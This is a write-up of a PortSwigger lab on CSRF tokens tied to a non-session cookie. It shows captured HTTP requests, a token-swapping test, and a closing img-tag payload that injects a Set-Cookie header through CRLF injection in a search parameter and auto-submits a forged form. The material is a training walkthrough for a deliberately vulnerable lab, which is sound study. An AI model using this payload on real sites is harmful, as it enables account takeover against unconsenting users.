## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/9b0fa0fc-3538-47a6-9c76-28553367992f)



## Overview :

**CSRF token is tied to a non-session cookie -**

In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 

> The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be
leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on staging.demo.normal-website.com
could be leveraged to place a cookie that is submitted to secure.normal-website.com. 

**Some times csrf token is tied to a cookie but this cookie is not related to the session of the user. This happens because the application uses 2 different frameworks one for session handling and one for csrf protection and both aren't integrated together.**


## Solution :


If we update the email of wiener, browser sends a request like this.



```http
POST /my-account/change-email HTTP/2
Host: 0a8a00fc04a8b93380af175700710093.web-security-academy.net
Cookie: session=ZPFZy0o8QHUK2RTfyaHqKIAbc97aoQd; csrfKey=yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net
Referer: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=user1%40user.net&csrf=I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD
```

We see that there is a **csrf token parameter in the body of the request & a csrfkey cookie in the header**. Both has two different values.



If we change the cookie value, then we get logged out.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/70cb63c0-8c3b-488f-bb16-5cc961e6024e)

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b6414afc-90af-422d-be95-a04c202c32d2)

**If we log in again, we get the same csrf token & also the same csrfkey as before but different session cookie.**

```http
POST /my-account/change-email HTTP/2
Host: 0a8a00fc04a8b93380af175700710093.web-security-academy.net
Cookie: session=ittvGu6fBbmpHK5rPxvZDCGA8SEFOafP; csrfKey=yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Origin: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net
Referer: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

email=test%40test.com&csrf=I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD
```

From this we can understand that system providing the CSRF protection does not integrate into the session system, but creates its own type of session that is not in sync.

**First let's login as wiener -**

- On viewing the page source, we can fint he csrf token of wiener - `I3gIUYvX6OQRl2TypteG8TfEkaCqbYgD`

- Click on inspect element & we can see that in the cookies we have the csrfkey - `yHUGj3LY69Q7aCPMTzNCEshBUBSURTfc`


**Log in as carlos -**

Open a incognito tab and login as carlos.

Update carlos's email & capture the request,

```http
POST /my-account/change-email HTTP/2
Host: 0a8a00fc04a8b93380af175700710093.web-security-academy.net
Cookie: session=cV2AxFTpez3Xml0BLiEx86RJUIXHDn7T; csrfKey=hCSFtEnq0dVU2t8DajouPWfooHhpPi2q
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net
Dnt: 1
Referer: https://0a8a00fc04a8b93380af175700710093.web-security-academy.net/my-account?id=carlos
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

email=test2%40test.net&csrf=FxkOmuSSG0XT01gCwdw8pDbTl1wcRGdW
```

- Carlos's csrf token - `FxkOmuSSG0XT01gCwdw8pDbTl1wcRGdW`
- Carlos's csrfkey - `hCSFtEnq0dVU2t8DajouPWfooHhpPi2q`

If we replace only the csrf token & csrf key of carlos's with wiener, the request gets accepted & the email of carlos is changed as expected.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/6451487d-2e12-4431-8748-f9e3f3b1c3fb)

#### Inject csrfkey cookie value by HTTP header injection

Send the above request to POC generator.

> Note that we have only changed the csrf token value to **anytoken**. The csrfkey value is still the same. It will have to be injected into victim's session. For this we can use a `<img>` tag, where we load the url along with HTTP header injection payload to inject the csrfkey value as anytoken . Since there is no image in that url , it will trigger an error. On error it will submit the form.


```html
<img src="https://0aa7009804198f7480e676da00a90003.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anytoken%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

